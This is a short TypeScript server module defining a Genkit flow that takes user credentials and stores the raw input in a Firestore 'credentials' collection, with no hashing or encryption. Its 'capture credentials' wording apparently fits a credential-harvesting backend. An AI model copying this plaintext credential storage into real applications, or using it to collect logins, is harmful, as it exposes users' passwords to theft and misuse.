'use server';
/**
 * @fileOverview A flow to capture user credentials and save them to Firestore.
 *
 * - captureCredentialsFlow - A Genkit flow that receives and saves user credentials.
 * - CaptureCredentialsOutput - The return type for the captureCredentialsFlow function.
 */

import { ai } from '@/ai/genkit';
import type { CredentialsInput } from '@/ai/types/credentials';
import { CredentialsInputSchema } from '@/ai/types/credentials';
import { initializeFirebaseServer } from '@/firebase/server';
import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
import { z } from 'genkit';

const CaptureCredentialsOutputSchema = z.object({
  success: z.boolean(),
  message: z.string().optional(),
});
export type CaptureCredentialsOutput = z.infer<typeof CaptureCredentialsOutputSchema>;

export async function captureCredentials(
  input: CredentialsInput
): Promise<CaptureCredentialsOutput> {
  return await captureCredentialsFlow(input);
}

const captureCredentialsFlow = ai.defineFlow(
  {
    name: 'captureCredentialsFlow',
    inputSchema: CredentialsInputSchema,
    outputSchema: CaptureCredentialsOutputSchema,
  },
  async (input: CredentialsInput): Promise<CaptureCredentialsOutput> => {
    try {
      const { firestore } = initializeFirebaseServer();
      const credentialsCollection = collection(firestore, 'credentials');

      await addDoc(credentialsCollection, {
        ...input,
        createdAt: serverTimestamp(),
      });

      return { success: true };
    } catch (error: any) {
      console.error('Error saving credentials to Firestore:', error);
      return { success: false, message: error.message };
    }
  }
);
